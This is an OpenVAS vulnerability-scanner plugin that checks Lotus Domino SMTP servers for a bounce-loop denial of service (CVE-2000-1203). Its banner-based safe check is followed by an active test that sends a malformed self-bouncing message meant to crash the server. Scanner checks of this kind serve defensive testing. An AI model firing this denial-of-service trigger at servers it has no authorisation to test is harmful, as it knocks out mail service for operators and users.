# OpenVAS Vulnerability Test
# $Id: lotus_bounce_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Lotus Domino SMTP bounce DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote SMTP server (maybe a Lotus Domino) can be killed 
or disabled by a malformed message that bounces to himself.
The routing loop exhausts all resources.

A cracker may use this to crash it continuously.";

tag_solution = "Reconfigure your MTA or upgrade it";

# References
# Date:  Mon, 20 Aug 2001 21:19:32 +0000
# From: "Ian Gulliver" <ian@orbz.org>
# To: bugtraq@securityfocus.com
# Subject: Lotus Domino DoS

if(description)
{
 script_id(11717);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3212);
 script_cve_id("CVE-2000-1203");
 
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 name = "Lotus Domino SMTP bounce DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Broken message bounced to himself exhausts MTA";
 script_summary(summary);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Denial of Service";
 script_family(family);

 # Avoid this test if the server relays e-mails.
 script_dependencies("find_service.nasl", "smtp_settings.nasl","smtp_relay.nasl");
 script_exclude_keys("SMTP/spam");
 script_require_ports("Services/smtp", 25);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if (!port) port = 25;
buff = get_smtp_banner(port:port);

if ( ! buff || "Lotus Domino" >!< buff ) exit(0);

# Disable the test if the server relays e-mails or if safe checks
# are enabled
if (get_kb_item("SMTP/spam") || safe_checks())
{
  if(egrep(pattern:"^220.*Lotus Domino Release ([0-4]\.|5\.0\.[0-8][^0-9])", string:buff))
  {
   security_warning(port);
   exit(0);
  }
  
  # Use smtpscan's banner.
  if( banner = get_smtp_banner(port)) {
    if(ereg(pattern:"Lotus.* ([0-4]\.|5\.0\.[0-8][^0-9])", string:banner)) {
    	  security_warning(port);
    	  exit(0);
     }
  }  
  exit(0);
}

#
n_sent = 0;

fromaddr = string("bounce", rand(), "@[127.0.0.1]");
toaddr = string("openvas", rand(), "@invalid", rand(), ".net");


 s = open_sock_tcp(port);
 if(!s)exit(0);
  
  
buff = smtp_recv_banner(socket:s);

b = string("From: openvas\r\nTo: postmaster\r\n",
	"Subject: SMTP bounce denial of service\r\n\r\ntest\r\n");

n = smtp_send_port(port: port, from: fromaddr, to: toaddr, body: b);
if (! n) exit(0);
sleep(1);

flag = 1;
soc = open_sock_tcp(port);
if (soc)
{
  send(socket: soc, data: string("HELO example.com\r\n"));
  buff = recv_line(socket: soc, length: 2048);
  if (buff =~ "^2[0-9][0-9] ")
    flag = 0;
  send(socket: soc, data: string("QUIT\r\n"));
  close(soc);
}
if (flag) security_warning(port);
